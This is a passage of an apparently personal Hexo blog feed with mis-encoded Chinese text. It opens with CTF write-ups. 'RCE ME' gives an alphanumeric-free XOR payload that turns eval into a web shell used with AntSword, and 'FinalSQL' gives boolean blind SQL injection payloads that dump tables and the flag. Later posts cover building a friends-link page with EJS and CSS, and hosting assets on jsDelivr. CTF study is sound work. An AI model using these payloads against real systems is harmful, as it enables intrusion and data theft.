class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;14129955-5097-4e0d-91ff-b200f9a11b5d&#125;</span><br></pre></td></tr></table></figure><h3 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE ME"></a>RCE ME</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">RCE</span><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">AntSword</span></p><p>é¢˜ç›®ä¸€å¼€å§‹å°±ç»™äº†æ®µå¾ˆé¡¶çš„ä»£ç ï¼Œç›´æ¥æŠŠå­—æ¯æ•°å­—éƒ½è¿‡æ»¤äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>ä¸€ç•ªæŸ¥æ‰¾ä¹‹ä¸‹æ‰¾åˆ°äº†ç¥å¥‡æ“ä½œï¼Œé€šè¿‡å…¶ä»–å­—ç¬¦çš„å¼‚æˆ–å¾—åˆ°å­—æ¯å’Œæ•°å­—æ¥æ„é€ æŒ‡ä»¤ã€‚<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html">åŸç†å‚è€ƒ</a> äºæ˜¯æˆ‘å½“å³ç”¨å¯ä»¥ä½¿ç”¨çš„å„ç§å­—ç¬¦ç›¸äº’å¼‚æˆ–æ‰“äº†ä¸ªè¡¨ï¼Œç„¶åç­›é€‰å‡ºäº†å¯æ„æˆå­—æ¯å’Œæ•°å­—çš„ç»„åˆã€‚ç„¶åç…§ç€æ„é€ äº†  <code>code=$_=%27`&#123;&#123;&#123;%27^%27?%3C%3E/%27;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&_=assert&__=eval($_POST[%22l%22])</code> è¿™ä¸ª payloadï¼ŒæˆåŠŸè¿ä¸Šã€‚ä½†æ˜¯å› ä¸ºè¿‡æ»¤äº†å¤ªå¤šä¸œè¥¿ï¼Œå¯¼è‡´ç»ˆç«¯å‘½ä»¤å‡ ä¹æ²¡æ³•æ‰§è¡Œã€‚</p><p>åœ¨ä¸€ç•ªæŸ¥è¯¢ä¹‹åæ‰¾åˆ°äº†èšå‰‘ï¼Œè¾—è½¬åœ¨ Kali Linux è£…ä¸Šä¹‹åç”¨ä¸Šäº† bypass disable çš„æ’ä»¶ï¼Œç„¶åæˆåŠŸæ‰§è¡Œäº† <code>readflag</code> è¯»å–åˆ°äº†flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b4c4e9fb-ea8c-4351-98e1-b1e8e5794411&#125;</span><br></pre></td></tr></table></figure><h3 id="FinalSQL"><a href="#FinalSQL" class="headerlink" title="FinalSQL"></a>FinalSQL</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span></p><p>è¿™é¢˜å…¶å®éœ€è¦ä¸€ç‚¹ä»”ç»†çš„è§‚å¯Ÿï¼Œè·Ÿä¹‹å‰å¼€é—¨è§å±±çš„æ³¨å…¥ç‚¹æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œç»™å‡ºçš„è´¦å·å’Œå¯†ç çš„æ¡†å¹¶ä¸æ˜¯æ³¨å…¥çš„åœ°æ–¹ã€‚ç‚¹å®Œäº”ä¸ªæŒ‰é’®å¯ä»¥æ‹¿åˆ°â€œç¬¬å…­ä¸ªæŒ‰é’®â€çš„æš—ç¤ºï¼Œäºæ˜¯çœ‹äº†ä¸€æ‰‹æºç ï¼Œå‘ç°æœ‰ä¸€è¡Œä»£ç è¢«æ³¨é‡Šæ‰äº†ï¼Œå–æ¶ˆæ³¨é‡Šå‘ç°äº†ä¸€ä¸ªæ¡†ï¼Œè¯·æ±‚æ˜¯ <code>../search.php?id=</code>ï¼Œä¹Ÿå°±æ˜¯é‚£å‡ ä¸ªæŒ‰é’®çš„ IDã€‚æ‰€æœ‰çš„ç»“æœéƒ½å‡ºç°è¿‡äº†ï¼Œå…¶å®ä¸€å¼€å§‹æˆ‘æ˜¯æ²¡æœ‰æ€è·¯çš„ï¼Œåæ¥è¢«æé†’äº†è¿™æ³¢æ˜¯ç›²æ³¨ï¼Œäºæ˜¯å°±æ„é€ äº†ä¸ª <code>(ascii(substr((select(database())),1,1))&gt;1)^0</code> è¯•äº†ä¸€æ‰‹ï¼Œå‘ç°å¤§äºå’Œå°äºçš„ç»“æœçš„ç¡®ä¸ä¸€æ ·ï¼ˆåˆ†åˆ«ä¼šå¯¹åº” <code>id=1</code> å’Œ <code>id=0</code> çš„ç»“æœï¼‰ï¼Œäºæ˜¯æ‹¿å‡ºä¹‹å‰å†™å¥½çš„äºŒåˆ†æ¨¡æ¿ï¼Œç•¥ä½œä¿®æ”¹è·‘äº†èµ·æ¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#çˆ†è¡¨</span><br><span class="line">(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),&quot; . $i . &quot;,1))&gt;&quot; . $_mid . &quot;)^0</span><br><span class="line">#çˆ†åˆ—</span><br><span class="line">(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema&#x3D;database())),&quot; . $i . &quot;,1))&gt;&quot; . $_mid . &quot;)^0</span><br><span class="line">#çˆ†å‡º flag</span><br><span class="line">(ascii(substr((select(group_concat(password))from(F1naI1y)),&quot; . $i . &quot;,1))&gt;&quot; . $_mid . &quot;)^0</span><br></pre></td></tr></table></figure><p>å…¶å®è¿™é¢˜è¿˜æ˜¯æœ‰ç‚¹å¿ƒæœºçš„ï¼Œflag æ”¾åœ¨äº†å¾ˆé•¿çš„ password é‡Œé¢ï¼ˆæ€»å…±200+å­—ç¬¦ï¼Œå¦‚æœä¸ç”¨äºŒåˆ†å¾—è·‘å¾ˆä¹…ï¼‰ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;43d07021-39af-481a-a873-3f9e1d0a29c0&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å‹æƒ…é“¾æ¥layoutæŠ˜è…¾è®°å½•</title>
      <link href="/zh-CN/posts/1574d4d2.html"/>
      <url>/zh-CN/posts/1574d4d2.html</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰ blog ä¸Šçš„å‹æƒ…é“¾æ¥æ¿å—ä¸€ç›´ä¾é äºä¸€ä¸ªç®€å•çš„ widget å®ç°ï¼Œä¸€å¼€å§‹ç”šè‡³æ˜¯ä¸€ä¸ªå®Œå…¨ä¸èƒ½å®¹çº³ä»»ä½•ç»†èŠ‚çš„åˆ—è¡¨å¼æ¸…å•ã€‚åæ¥ç…§ç€å…¶ä»– widget çš„å†™æ³•ï¼Œç¨å¾®ä¿®æ”¹äº†ä¸€ä¸‹ layout å®ç°äº†ç®€æ´çš„è¯¦ç»†ä¿¡æ¯å±•ç¤ºï¼Œä½†æ˜¯ BUG ä¹Ÿéšä¹‹è€Œæ¥ã€‚åœ¨ä¸åŒç¼©æ”¾æ¯”ä¾‹ä¸‹ï¼Œå†…å®¹ä¼šæº¢å‡ºå®¹å™¨ï¼Œæ˜¾å¾—æä¸åè°ƒã€‚å†è€…ï¼Œå•ç‹¬çš„ widget å§‹ç»ˆä¸æ˜¯é•¿ä¹…ä¹‹è®¡ï¼Œäºæ˜¯æŠ˜è…¾äº†ä¸€ä¸ªé¡µé¢ã€‚</p><p><escape><span id="more"></span></escape></p><h4 id="åˆæœŸæ¢ç´¢"><a href="#åˆæœŸæ¢ç´¢" class="headerlink" title="åˆæœŸæ¢ç´¢"></a>åˆæœŸæ¢ç´¢</h4><p>Icarus è¿™ä¸ªä¸»é¢˜ä½¿ç”¨ ejs æ¥ç”Ÿæˆé¡µé¢ï¼Œå› æ­¤ï¼Œæˆ‘å¤§è‡´æ•´ç†äº†ä¸€äº›ç»†èŠ‚ã€‚</p><h5 id="å‡ ç§æ ‡ç­¾çš„æ„ä¹‰"><a href="#å‡ ç§æ ‡ç­¾çš„æ„ä¹‰" class="headerlink" title="å‡ ç§æ ‡ç­¾çš„æ„ä¹‰"></a><strong>å‡ ç§æ ‡ç­¾çš„æ„ä¹‰</strong></h5><ul><li><p><code>&lt;%</code> â€˜è„šæœ¬â€™ æ ‡ç­¾ï¼Œç”¨äºæµç¨‹æ§åˆ¶ï¼Œæ— è¾“å‡ºã€‚</p></li><li><p><code>&lt;%_</code> åˆ é™¤å…¶å‰é¢çš„ç©ºæ ¼ç¬¦</p></li><li><p><code>&lt;%=</code> è¾“å‡ºæ•°æ®åˆ°æ¨¡æ¿ï¼ˆè¾“å‡ºæ˜¯è½¬ä¹‰ HTML æ ‡ç­¾ï¼‰</p></li><li><p><code>&lt;%-</code> è¾“å‡ºéè½¬ä¹‰çš„æ•°æ®åˆ°æ¨¡æ¿</p></li><li><p><code>&lt;%#</code> æ³¨é‡Šæ ‡ç­¾ï¼Œä¸æ‰§è¡Œã€ä¸è¾“å‡ºå†…å®¹</p></li><li><p><code>&lt;%%</code> è¾“å‡ºå­—ç¬¦ä¸² â€˜&lt;%â€™</p></li><li><p><code>%&gt;</code> ä¸€èˆ¬ç»“æŸæ ‡ç­¾</p></li><li><p><code>-%&gt;</code> åˆ é™¤ç´§éšå…¶åçš„æ¢è¡Œç¬¦</p></li><li><p><code>_%&gt;</code> å°†ç»“æŸæ ‡ç­¾åé¢çš„ç©ºæ ¼ç¬¦åˆ é™¤</p></li></ul><h5 id="config-yml-ä¸ä»£ç çš„é“¾æ¥"><a href="#config-yml-ä¸ä»£ç çš„é“¾æ¥" class="headerlink" title="_config.yml ä¸ä»£ç çš„é“¾æ¥"></a><strong>_config.yml ä¸ä»£ç çš„é“¾æ¥</strong></h5><p>åœ¨ layout çš„ä»£ç ä¸­ï¼Œä½¿ç”¨ <code>theme</code> è¿™ä¸€ä¸ªå¯¹è±¡å¯ä»¥è®¿é—®æ•´ä¸ª <code>theme/_config.yml</code> ä¸­çš„æ‰€æœ‰é…ç½®ã€‚è€Œä½¿ç”¨å¯¹è±¡çš„è®¿é—®æ–¹æ³•å¯å¯¹å…¶é€å±‚é€’è¿›ï¼Œ <code>theme.widgets</code> å¯ä»¥è®¿é—®åˆ°å„ widget çš„é…ç½®ã€‚ä½†è¿™æ—¶å€™çš„ <code>theme.widgets</code> å®é™…ä¸Šå·²ç»å˜æˆäº†ä¸€ä¸ªå¯éå†çš„æ•°ç»„ï¼Œå…¶å½¢å¼æœ‰ç‚¹ç±»ä¼¼äº Python ä¸­çš„å­—å…¸ã€‚è€Œè¿™äº› key å¯¹åº”çš„ value åˆæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå½“ä½ å°è¯•æŠŠå®ƒè¾“å‡ºï¼Œä¼šå¾—åˆ° <code>[Object object]</code> è¿™æ ·çš„ç»“æœã€‚å› æ­¤ï¼Œä¸ºäº†è®¿é—®åˆ°å•ç‹¬çš„ <code>friend</code> è¿™ä¸€å±‚ï¼Œå°±å¾—è½¬æ¢ä¸¤æ¬¡ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">widgets:</span></span><br><span class="line">    <span class="bullet">-</span></span><br><span class="line">        <span class="attr">type:</span> <span class="string">friends</span></span><br><span class="line">        <span class="attr">position:</span> <span class="string">left</span></span><br><span class="line">        <span class="attr">friends:</span></span><br><span class="line">            <span class="attr">friend1:</span> </span><br><span class="line">                <span class="attr">url:</span> <span class="string">&#x27;testUrl&#x27;</span></span><br><span class="line">                <span class="attr">description:</span> <span class="string">&#x27;testDescription&#x27;</span></span><br><span class="line">                <span class="attr">avatar:</span> <span class="string">&#x27;avatarUrl&#x27;</span></span><br><span class="line">            <span class="attr">friend2:</span> </span><br><span class="line">                <span class="attr">url:</span> <span class="string">&#x27;testUrl&#x27;</span></span><br><span class="line">                <span class="attr">description:</span> <span class="string">&#x27;testDescription&#x27;</span></span><br><span class="line">                <span class="attr">avatar:</span> <span class="string">&#x27;avatarUrl&#x27;</span></span><br><span class="line">    <span class="bullet">-</span></span><br></pre></td></tr></table></figure><h5 id="layout-ä¸é¡µé¢æ¸²æŸ“çš„é“¾æ¥"><a href="#layout-ä¸é¡µé¢æ¸²æŸ“çš„é“¾æ¥" class="headerlink" title="layout ä¸é¡µé¢æ¸²æŸ“çš„é“¾æ¥"></a><strong>layout ä¸é¡µé¢æ¸²æŸ“çš„é“¾æ¥</strong></h5><p>è¦å°†é¡µé¢æ¨¡æ¿ä¸ç‹¬ç«‹é¡µé¢é“¾æ¥åœ¨ä¸€èµ·ï¼Œä½¿ Hexo åœ¨ç”Ÿæˆé¡µé¢çš„æ—¶å€™æŒ‰ç…§æ‰€å†™æ¨¡æ¿ç”Ÿæˆï¼Œåªéœ€è¦å°†æ¨¡æ¿æ”¾åˆ° <code>root/to/theme/path/layout</code> ä¸‹ã€‚ç„¶åæ–°å»ºä¸€ä¸ªæ™®é€šé¡µé¢ã€‚åœ¨é¡¶éƒ¨æ·»åŠ  <code>layout: layoutName</code> ä¸€è¡Œç„¶åä¿å­˜ã€‚ <span class="heimu" title="ä½ å‘ç°äº†ï¼ï¼">æ³¨æ„ç©ºæ ¼ï¼ï¼</span></p><h4 id="ç…§ç€é¡µé¢å†™æ¨¡æ¿"><a href="#ç…§ç€é¡µé¢å†™æ¨¡æ¿" class="headerlink" title="ç…§ç€é¡µé¢å†™æ¨¡æ¿"></a>ç…§ç€é¡µé¢å†™æ¨¡æ¿</h4><p>è¿™ä¸€éƒ¨åˆ†ï¼Œå‰æ’æ„Ÿè°¢ <a href="https://dwd.moe">Bhao</a> å¤§ä½¬çš„å¸®åŠ©ã€‚<br><br>å‚è€ƒç€å¤§ä½¬çš„ CSS ï¼Œæˆ‘æˆåŠŸåœ°å†™å‡ºäº†è‡ªé€‚åº”ç¼©æ”¾çš„é¡µé¢æ¨¡æ¿ã€‚è€Œä¸¤æ¬¡è½¬æ¢å¯¹è±¡è®¿é—®åˆ°æ¯ä¸€ä¸ª <code>friend</code> çš„ä»£ç æ˜¯è¿™æ ·çš„ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;% for (widget in theme.widgets)&#123; %&gt;</span><br><span class="line">    &lt;% if (theme.widgets[widget].type == &#x27;friends&#x27;)&#123; %&gt;</span><br><span class="line">        &lt;% let count = 0; %&gt;</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;friendLink-Area&quot;</span>&gt;</span></span><br><span class="line">        &lt;% for (nickname in theme.widgets[widget].friends)&#123; %&gt;</span><br><span class="line">            &lt;% let friend = theme.widgets[widget].friends[nickname]; %&gt;</span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&lt;%= friend.url %&gt;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;friendLink-square card&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;friendLink-img&quot;</span> <span class="attr">style</span>=<span class="string">&quot;text-align: left; pointer-events: none;&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&lt;%= friend.avatar %&gt;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;level-item friendLink-nickname&quot;</span> <span class="attr">style</span>=<span class="string">&quot;margin-bottom: 0px;&quot;</span>&gt;</span></span><br><span class="line">                    &lt;%= nickname %&gt;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;friendLink-description&quot;</span>&gt;</span></span><br><span class="line">                    &lt;%= friend.description %&gt;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;friendLink-url level-item tag&quot;</span>&gt;</span></span><br><span class="line">                    &lt;%- get_domain(friend.url) %&gt;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            &lt;% count++; %&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">    &lt;% &#125; %&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™æ®µä»£ç çš„ä¸Šé¢æ¥ä¸ŠåŸæœ¬é¡µé¢çš„æ¡†æ¶ä»£ç ï¼Œåœ¨ä¸‹é¢æ¥ä¸Šä¸€ä¸ªè‡ªå®šä¹‰æ ‡é¢˜çš„è¯„è®ºåŒºï¼Œå†åŠ å…¥ä¸€ç‚¹ç‚¹ç»†èŠ‚ï¼Œå°±å½¢æˆäº† <a href="https://lemonprefect.cn/friends">å‹é“¾é¡µé¢</a> è¿™æ ·ä¸€ä¸ªé¡µé¢ã€‚</p><p>è‡³äºå…·ä½“æ˜¾ç¤ºå‡ºæ¥çš„æ•ˆæœå˜›ï¼Œç¡®å®šäº†æ¡†æ¶ï¼Œæ¥ä¸‹æ¥å‘æŒ¥çš„å°±æ˜¯ CSS å•¦ã€‚å¥—ç”¨ä¸€éƒ¨åˆ†åŸæ¥åœ¨ widget ä¸Šä½¿ç”¨çš„ CSSã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.friendLink-card</span> &#123;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">97px</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">10086px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.friendLink-img</span> &#123;</span><br><span class="line"><span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.friendLink-img</span> <span class="selector-tag">img</span> &#123;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">6px</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">85px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.friendLink-nickname</span> &#123;</span><br><span class="line"><span class="attribute">margin-top</span>: <span class="number">6px</span>;</span><br><span class="line"><span class="attribute">margin-left</span>: <span class="number">100px</span>;</span><br><span class="line"><span class="attribute">padding-bottom</span>: <span class="number">3px</span>;</span><br><span class="line"><span class="attribute">width</span>: auto;</span><br><span class="line"><span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.friendLink-description</span> &#123;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">43px</span>;</span><br><span class="line"><span class="attribute">color</span>: grey;</span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">10px</span>;</span><br><span class="line"><span class="attribute">margin-left</span>: <span class="number">100px</span>;</span><br><span class="line"><span class="attribute">overflow</span>: hidden;</span><br><span class="line"><span class="attribute">text-align</span>: left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.friendLink-url</span> &#123;</span><br><span class="line"><span class="attribute">text-align</span>: right;</span><br><span class="line"><span class="attribute">margin-right</span>: <span class="number">0px</span>;</span><br><span class="line"><span class="attribute">float</span>: right;</span><br><span class="line"><span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå†åŠ ä¸Šæ•´ä½“ç‰ˆé¢çš„ä¸€ä¸ª area</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.friendLink-Area</span>&#123;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">6px</span>;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">18px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.friendLink-Area</span> <span class="selector-tag">a</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#363636</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.friendLink-square</span>&#123;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">4px</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">280px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">110px</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0.5em</span> <span class="number">0.75em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.friendLink-square</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#f5f5f5</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#f5f5f5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ç»†èŠ‚ä¿®æ­£"><a href="#ç»†èŠ‚ä¿®æ­£" class="headerlink" title="ç»†èŠ‚ä¿®æ­£"></a>ç»†èŠ‚ä¿®æ­£</h4><p>é‰´äºåŸæœ¬çš„ widget åœ¨æ‰‹æœºç«¯è‡ªé€‚åº”è®¿é—®çš„æ—¶å€™ä¼šæ˜¾å¾—å¾ˆç´¯èµ˜ï¼Œæ‰€ä»¥ï¼Œåœ¨æ¨¡æ¿ä¸­åŠ å…¥ä¸€æ®µ JS æ¥åœ¨è¿™ä¸ªé¡µé¢ä¸­å°†åŸæœ¬çš„ widget åˆ é™¤æ‰ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> widgetFriends = <span class="built_in">document</span>.getElementById(<span class="string">&quot;widgetFriends&quot;</span>);</span><br><span class="line">        widgetFriends.remove();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œå°† CSS æ”¾åˆ° jsDelivr ä¸Šï¼Œç„¶ååœ¨æ¨¡æ¿ä¸­å¼•ç”¨ï¼Œå°±æˆåŠŸä¸Šçº¿äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BlogModify </tag>
            
            <tag> Layout </tag>
            
            <tag> CSS </tag>
            
            <tag> Script </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç”¨jsDelivråˆ†å‘èµ„æº</title>
      <link href="/zh-CN/posts/831655bb.html"/>
      <url>/zh-CN/posts/831655bb.html</url>
      
        <content type="html"><![CDATA[<p>æŸæ¬¡ä¿®æ”¹ blog æ¨¡æ¿çš„æ—¶å€™ï¼Œçœ‹åˆ°äº† jsDelivr ä¸‹å‘çš„ä¸€æ®µ CSS ï¼Œå½“æ—¶ä»¥ä¸ºæ˜¯ä¸ªæœ¬åœ°çš„æ–‡ä»¶ï¼Œä½†éå¯»ä¸è§ã€‚é‚è¯·æ•™å¤§ä½¬ï¼Œå¾—çŸ¥äº† jsDelivr è¿™ä¸ªä¸œè¥¿ã€‚æœç´¢äº†ä¸€æ³¢ï¼Œå‘ç°ä½¿ç”¨ GitHub + jsDelivr æ¥åšä¸ªèµ„æºåˆ†å‘æå¥½ã€‚</p><p><escape><span id="more"></span></escape></p><h4 id="ç†æƒ³å›¾åºŠï¼Ÿ"><a href="#ç†æƒ³å›¾åºŠï¼Ÿ" class="headerlink" title="ç†æƒ³å›¾åºŠï¼Ÿ"></a>ç†æƒ³å›¾åºŠï¼Ÿ</h4><p>çœ‹äº†ä¸€åœˆï¼Œå‘ç°è¿™ä¸ªæ–¹æ¡ˆç”¨æ¥åšä¸€æ³¢å›¾åºŠä¹Ÿæ˜¯æç¨³çš„ï¼Œä¸€æ–¹é¢æ‰€æœ‰å›¾ç‰‡éƒ½æ¥è‡ªè‡ªå·±çš„ GitHub åº“ï¼Œä¸€æ–¹é¢å¼•ç”¨ä¹Ÿä¸ç”¨æ‹…å¿ƒå¤±æ•ˆã€‚ <span class="heimu" title="å˜¿å˜¿:)">å…¶å®ä¹Ÿä¸ºäº†åŠ å¿« blog çš„è®¿é—®é€Ÿåº¦ï¼Œé¿å…æ‰€æœ‰èµ„æºéƒ½ä»åŒä¸€ä¸ªåœ°æ–¹è·å–</span></p><h4 id="repo-çš„å»ºç«‹"><a href="#repo-çš„å»ºç«‹" class="headerlink" title="repo çš„å»ºç«‹"></a>repo çš„å»ºç«‹</h4><p>è€ƒè™‘åˆ° blog ä¸­ä½¿ç”¨çš„æ–‡ä»¶æ— éæ˜¯å›¾ç‰‡å’Œ CSS/JS ï¼Œäºæ˜¯é¡ºæ‰‹æ–°å»ºäº†ä¸€ä¸ªé¡¹ç›®ï¼Œä¸‰ç§æ–‡ä»¶åˆ†å¼€ã€‚å›¾ç‰‡å¦å¤–åˆ†ä½œå°é¢å’Œæ–‡ç« ä¸­çš„å›¾ï¼Œè€Œæ–‡ç« ä¸­çš„å›¾ç‰‡å–å…¶ MD5 ä½œä¸ºå…¶åç§°ã€‚ <span class="heimu" title="å˜¿å˜¿:)">è¿™æ 